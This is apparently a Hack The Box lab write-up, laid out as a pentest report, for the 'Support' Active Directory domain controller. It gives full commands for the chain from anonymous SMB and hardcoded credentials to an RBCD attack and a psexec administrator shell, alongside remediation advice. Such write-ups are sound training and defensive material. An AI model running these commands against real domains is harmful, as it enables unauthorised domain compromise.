# HTB Support Writeup

```text
================================================================================
                         HTB SUPPORT - WRITEUP
================================================================================

TARGET INFO
-----------
IP:            10.129.230.181
Hostname:      dc.support.htb
OS:            Windows Server 2022 Build 20348 x64
Domain:        support.htb
Type:           Active Directory / Domain Controller
Author:         vishalgodseye
Date:           2026-06-03
Difficulty:     Easy-Medium

================================================================================
                         EXECUTIVE SUMMARY
================================================================================

Support is an HTB Active Directory Domain Controller running Windows Server 2022.
The engagement began with anonymous SMB access revealing a share called
"support-tools" containing a UserInfo.exe application. Decompilation of this
.NET executable revealed hardcoded credentials for the "ldap" service account.

Using these credentials, LDAP enumeration revealed domain users and the "support"
user account, whose password was stored in the LDAP "info" attribute as a note.
This granted WinRM access to the machine. The "support" account held the
SeMachineAccountPrivilege, enabling a Resource-Based Constrained Delegation
(RBCD) attack. By creating a fake computer account (Hacker$), we modified
delegation rights on the DC, obtained a Silver Ticket impersonating the domain
administrator, and achieved full system compromise via PsExec.

Vulnerability Summary:
Severity  | Finding                                    | Status
----------|--------------------------------------------+--------
HARD      | Hardcoded creds in UserInfo.exe             | Exploited
HARD      | Password stored in LDAP info attribute       | Exploited
HARD      | SeMachineAccountPrivilege abuse (RBCD)       | Exploited
MEDIUM    | Anonymous SMB share access                   | Exploited

================================================================================
                         SCOPE & METHODOLOGY
================================================================================

Target:        10.129.230.181 (dc.support.htb)
Ports:         53,88,135,139,389,445,464,593,636,3268,3269,5985,9389
Web Apps:      None identified
Exclusions:    None

Methodology Phases:
  1. Port scanning (rustscan, nmap)
  2. SMB enumeration (smbclient, netexec)
  3. File analysis (UserInfo.exe decompilation)
  4. LDAP enumeration (ldapsearch, netexec)
  5. Credential abuse (evil-winrm)
  6. Privilege escalation via RBCD
  7. Domain compromise (silver ticket, psexec)

Tools Used:
  - rustscan 2.x (port discovery)
  - nmap 7.99 (service versioning)
  - smbclient (SMB file access)
  - netexec (SMB/LDAP/WinRM enumeration)
  - ILSpy / dnSpy (.NET decompilation)
  - ldapsearch (AD attribute queries)
  - evil-winrm (shell access)
  - impacket (rbcd.py, getST.py, addcomputer.py, psexec.py)
  - Kerberos (ticket management)

================================================================================
                         ENUMERATION
================================================================================

3.1 Port Scan (rustscan + nmap)
-------------------------------
+------+----------+---------------------------+-------------------------------+
| Port | Protocol | Service                   | Version/Notes                 |
+------+----------+---------------------------+-------------------------------+
|   53 | TCP      | DNS                       | Simple DNS Plus               |
|   88 | TCP      | Kerberos                  | Microsoft Windows Kerberos    |
|  135 | TCP      | MSRPC                     | Microsoft Windows RPC         |
|  139 | TCP      | NetBIOS                   | Microsoft Windows netbios-ssn |
|  389 | TCP      | LDAP                      | AD LDAP (support.htb)         |
|  445 | TCP      | SMB                       | Microsoft-DS                  |
|  464 | TCP      | kpasswd5                  | Kerberos password change      |
|  593 | TCP      | RPC over HTTP             | ncacn_http 1.0                |
|  636 | TCP      | LDAPS                     | tcpwrapped                    |
| 3268 | TCP      | Global Catalog            | AD LDAP                       |
| 3269 | TCP      | Global Catalog SSL        | tcpwrapped                    |
| 5985 | TCP      | WinRM                     | Microsoft-HTTPAPI/2.0         |
| 9389 | TCP      | .NET Message Framing      | mc-nmf                        |
|49664 | TCP      | MSRPC                     | Dynamic RPC                   |
|49667 | TCP      | MSRPC                     | Dynamic RPC                   |
|49676 | TCP      | RPC over HTTP             | ncacn_http 1.0                |
|49681 | TCP      | MSRPC                     | Dynamic RPC                   |
|49701 | TCP      | MSRPC                     | Dynamic RPC                   |
+------+----------+---------------------------+-------------------------------+

Host info from SMB:
  Name: DC
  OS: Windows Server 2022 Build 20348 x64
  Domain: support.htb
  Signing: True
  SMBv1: None
  Null Auth: True

3.2 SMB Shares (Anonymous Access)
------------------------------------
  ADMIN$          Disk      Remote Admin
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
  NETLOGON        Disk      Logon server share
  support-tools   Disk      support staff tools
  SYSVOL          Disk      Logon server share

3.3 support-tools Share Contents
----------------------------------
smb: \> ls
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022

3.4 UserInfo.exe Analysis
---------------------------
FileInfo.exe.zip extracted contents:
  CommandLineParser.dll
  Microsoft.Bcl.AsyncInterfaces.dll
  Microsoft.Extensions.DependencyInjection.Abstractions.dll
  Microsoft.Extensions.DependencyInjection.dll
  Microsoft.Extensions.Logging.Abstractions.dll
  System.Buffers.dll
  System.Memory.dll
  System.Numerics.Vectors.dll
  System.Runtime.CompilerServices.Unsafe.dll
  System.Threading.Tasks.Extensions.dll
  UserInfo.exe
  UserInfo.exe.config

Decompilation (ILSpy/dnSpy) revealed Protect.cs class containing encryption
logic for password protection. Decryption yielded:

+----+------------------------------------------------------------------+
| username: support\ldap                                            |
| password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz                    |
+----+------------------------------------------------------------------+

Source: Decompiled UserInfo.exe share binary via anonymous SMB

3.5 LDAP Enumeration (ldap credentials)
-----------------------------------------
Command: netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf
         8x$tRWxPWO1%lmz' -d support.htb

[+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Password verified valid via netexec LDAP authentication.

Domain Users (20 total):
  Administrator        - Built-in admin account
  Guest                - Built-in guest account
  krbtgt               - KDC service account
  ldap                 - Service account (compromised)
  support              - Service account (password in info field)
  smith.rosario        - Stan
  hernandez.stanley    -
  wilson.shelby        -
  anderson.damian      -
  thomas.raphael       -
  levine.leopoldo      -
  raven.clifton        -
  bardot.mary          -
  cromwell.gerard      -
  monroe.david         -
  west.laura           -
  langley.lucy         -
  daughtler.mabel      -
  stoll.rachelle       -
  ford.victoria        -

Domain Groups (46 total):
  Notable groups with members:
    Administrators           (3)
    Domain Admins            (1)
    Enterprise Admins        (1)
    Schema Admins            (1)
    Group Policy Creator Owners (1)
    IIS_IUSRS                (1)
    Remote Management Users  (1)
    Shared Support Accounts  (1)
    Pre-Windows 2000 Compatible Access (1)
    Windows Authorization Access Group (1)

LDAP Query - support user attribute dump:
  ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb"
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    -b "DC=support,DC=htb" "(sAMAccountName=support)" "*"

  Key attributes:
    info: Ironside47pleasure40Watchful
    memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
    memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb

+----+------------------------------------------------------------------+
| WINRM CREDENTIALS (support user)                                  |
| username: support                                                  |
| password: Ironside47pleasure40Watchful                            |
| source:   LDAP 'info' attribute (password stored as notes)        |
+----+------------------------------------------------------------------+

================================================================================
                         VULNERABILITY DETAILS
================================================================================

VULN 1: Hardcoded Credentials in Application Binary
---------------------------------------------------
CVE:    N/A
CVSS:   9.8 (Critical)
Location: SMB share \\10.129.230.181\support-tools\UserInfo.exe.zip
Description:
  A .NET executable (UserInfo.exe) was found on an anonymously accessible SMB
  share. Decompilation of this binary revealed hardcoded credentials for the
  "ldap" service account belonging to the "Shared Support Accounts" group.

Impact:
  - Full access to LDAP directory including all user attributes
  - Ability to enumerate users, groups, and computer objects
  - Springboard for further credential harvesting and lateral movement
  - Led directly to discovery of the support user password

Remediation:
  - Remove or restrict access to the support-tools share
  - Never store credentials in application source code
  - Use DPAPI or Windows Credential Manager for secret storage
  - Audit and rotate the compromised ldap account credentials

VULN 2: Password Stored in LDAP info Attribute
----------------------------------------------
CVE:    N/A
CVSS:   8.5 (High)
Location: LDAP - support user object, "info" attribute
Description:
  The "support" user account had its password stored in cleartext within the
  "info" attribute (LDAP field intended for notes/comments). Any domain user
  with LDAP read access could retrieve this password.

Impact:
  - Password readable by any authenticated domain user
  - Direct WinRM access to the Domain Controller
  - Member of Remote Management Users group
  - Led directly to interactive shell on the target

Remediation:
  - Remove passwords from all LDAP attributes (info, description, etc.)
  - Restrict LDAP read permissions on sensitive user attributes
  - Enforce credential hygiene policies across the organization
  - Rotate the support account password immediately

VULN 3: Resource-Based Constrained Delegation (RBCD) Abuse
----------------------------------------------------------
CVE:    N/A
CVSS:   10.0 (Critical)
Location: Domain Controller (DC.support.htb)
Description:
  The "support" user account possessed the SeMachineAccountPrivilege, which
  allows adding computer accounts to the domain. This privilege was abused
  to create a fake computer account (Hacker$), set msDS-AllowedToActOnBehalf
  -OfOtherIdentity on the DC object, and impersonate the domain administrator
  via S4U2Self/S4U2Proxy (Silver Ticket).

Attack Chain:
  1. Created computer account Hacker$ with password Pa$$w0rd
  2. Modified DC$ msDS-AllowedToActOnBehalfOfOtherIdentity to allow Hacker$
     delegation
  3. Generated Silver Ticket for Administrator@cifs/dc.support.htb
  4. Used ticket to authenticate via psexec.py and obtain root shell

Impact:
  - Full compromise of the Domain Controller
  - Domain Administrator-level access to the entire AD forest
  - Complete data exfiltration and persistent access possible

Remediation:
  - Remove SeMachineAccountPrivilege from non-admin accounts
  - Restrict computer account creation to authorized administrators
  - Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
  - Implement tiered administration model
  - Review DC delegation settings

VULN 4: Anonymous SMB Share Access
----------------------------------
CVE:    N/A
CVSS:    5.3 (Medium)
Location: SMB - support-tools share, NULL authentication
Description:
  The SMB service on the Domain Controller allowed anonymous (NULL) session
  connections. This granted read access to the "support-tools" share
  containing application binaries and utilities.

Impact:
  - Unauthorized read access to support tools
  - Exposure of sensitive application code (UserInfo.exe)
  - Entry point for the entire attack chain

Remediation:
  - Disable NULL session authentication on the Domain Controller
  - Remove the support-tools share or restrict access to authorized users
  - Audit all SMB shares for anonymous/unauthenticated access
  - Implement SMB signing requirements

VULN 5: SMB Signing Not Required
--------------------------------
CVE:    N/A
CVSS:    5.3 (Medium)
Location: SMB service
Description:
  While SMB signing was enabled, it was marked as optional ("signing enabled
  and required" was not fully enforced). This could potentially allow
  NTLM relay attacks against LDAP if environment permits.

Impact:
  - Potential for man-in-the-middle / relay attacks
  - Credential relay from captured NTLM authentication

Remediation:
  - Enforce SMB signing (required) on all domain members
  - Disable NTLM authentication where possible
  - Implement LDAP signing and LDAPS channel binding

================================================================================
                         FLAGS CAPTURED
================================================================================

+----+------------------------------------------------------------------+
| <FLAG>                                                            |
| Location: C:\Users\support\Desktop                                |
| Source:   evil-winrm session as support user                      |
+----+------------------------------------------------------------------+

+----+------------------------------------------------------------------+
| <FLAG>                                                            |
| Location: C:\Users\Administrator\Desktop                          |
| Source:   psexec.py with Silver Ticket (Administrator)            |
+----+------------------------------------------------------------------+

================================================================================
                         EXPLOITATION STEPS
================================================================================

Step 1: Anonymous SMB Access
  smbclient -L //10.129.230.181 -N
  smbclient //10.129.230.181/support-tools -N
  smb: \> get UserInfo.exe.zip

Step 2: Decompile UserInfo.exe
  unzip UserInfo.exe.zip
  # Open UserInfo.exe in ILSpy or dnSpy
  # Locate Protect.cs with encryption logic
  # Decrypt to reveal: support\ldap / nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Step 3: LDAP Enumeration with ldap credentials
  netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    -d support.htb --users
  netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    -d support.htb --groups

Step 4: Retrieve support user password from LDAP
  ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb"
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    -b "DC=support,DC=htb" "(sAMAccountName=support)" "*"
  # Found: info: Ironside47pleasure40Watchful

Step 5: WinRM Access as support
  evil-winrm -i 10.129.230.181 -u support -p Ironside47pleasure40Watchful
  # Retrieve user.txt from C:\Users\support\Desktop

Step 6: Verify Privileges
  whoami /priv
  # Confirmed: SeMachineAccountPrivilege is Enabled

Step 7: Create Fake Computer Account
  addcomputer.py support.htb/support:'Ironside47pleasure40Watchful'
    -computer-name 'Hacker' -computer-pass 'Pa$$w0rd' -dc-ip 10.129.230.181

Step 8: Configure RBCD Delegation
  rbcd.py support.htb/support:'Ironside47pleasure40Watchful'
    -delegate-from 'Hacker$' -delegate-to 'DC$' -action write -dc-ip 10.129.230.181
  # Output: Hacker$ can now impersonate users on DC$ via S4U2Proxy

Step 9: Generate Silver Ticket
  getST.py -spn cifs/dc.support.htb -impersonate Administrator
    -dc-ip 10.129.230.181 support.htb/Hacker$:Pa$$w0rd
  export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

Step 10: Domain Admin Shell
  psexec.py -k -no-pass dc.support.htb
  # Navigate to C:\Users\Administrator\Desktop
  # Retrieve root.txt

================================================================================
                         REMAINING ATTACK SURFACE
================================================================================

1. Kerberoasting - Service accounts with SPNs could be targeted for offline
   cracking (not needed for full compromise).

2. AS-REP Roasting - Check for DONT_REQUIRE_PREAUTH on any accounts
   (not needed for full compromise).

3. LLMNR/NBT-NS Poisoning - Could capture NTLM hashes on the local network
   if Responder is deployed (not tested).

4. DCSync - With Domain Admin access, secretsdump.py could extract all
   domain hashes including krbtgt (post-exploitation).

5. GPO Abuse - Review Group Policy Objects for misconfigurations that
   could grant additional access (post-exploitation).

6. Trust Relationships - If forest trusts exist, lateral movement to other
   domains may be possible (not tested - single domain environment).

================================================================================
                         RECOMMENDATIONS
================================================================================

+--+----------+------------------------------------------------------+--------+
|# | Priority | Recommendation                                       | Effort |
+--+----------+------------------------------------------------------+--------+
| 1| CRITICAL | Remove passwords from LDAP info/description fields   | Low    |
|  |          | and rotate all exposed credentials immediately.      |        |
+--+----------+------------------------------------------------------+--------+
| 2| CRITICAL | Remove SeMachineAccountPrivilege from non-admin      | Low    |
|  |          | accounts. Restrict computer account creation to       |        |
|  |          | authorized administrators only.                       |        |
+--+----------+------------------------------------------------------+--------+
| 3| CRITICAL | Remove or restrict anonymous access to the           | Low    |
|  |          | support-tools SMB share. Audit all shares for         |        |
|  |          | NULL session access.                                  |        |
+--+----------+------------------------------------------------------+--------+
| 4| HIGH     | Remove hardcoded credentials from UserInfo.exe and   | Medium |
|  |          | any other application binaries. Use DPAPI or a        |        |
|  |          | secrets management solution.                          |        |
+--+----------+------------------------------------------------------+--------+
| 5| HIGH     | Enforce SMB signing (required) on all domain         | Medium |
|  |          | members to prevent NTLM relay attacks.                |        |
+--+----------+------------------------------------------------------+--------+
| 6| HIGH     | Implement tiered administration model to restrict    | High   |
|  |          | service account privileges on Domain Controllers.     |        |
+--+----------+------------------------------------------------------+--------+
| 7| MEDIUM   | Monitor msDS-AllowedToActOnBehalfOfOtherIdentity     | Medium |
|  |          | attribute changes on all domain controllers.          |        |
+--+----------+------------------------------------------------------+--------+
| 8| MEDIUM   | Disable NTLM authentication where possible and       | High   |
|  |          | enforce LDAPS with channel binding.                   |        |
+--+----------+------------------------------------------------------+--------+
| 9| MEDIUM   | Implement regular credential hygiene audits across   | Medium |
|  |          | the domain (password age, reuse, exposure).           |        |
+--+----------+------------------------------------------------------+--------+
|10| Low      | Remove unnecessary portable applications from        | Low    |
|  |          | shared folders on production systems.                 |        |
+--+----------+------------------------------------------------------+--------+

================================================================================
                         END OF REPORT
================================================================================

```
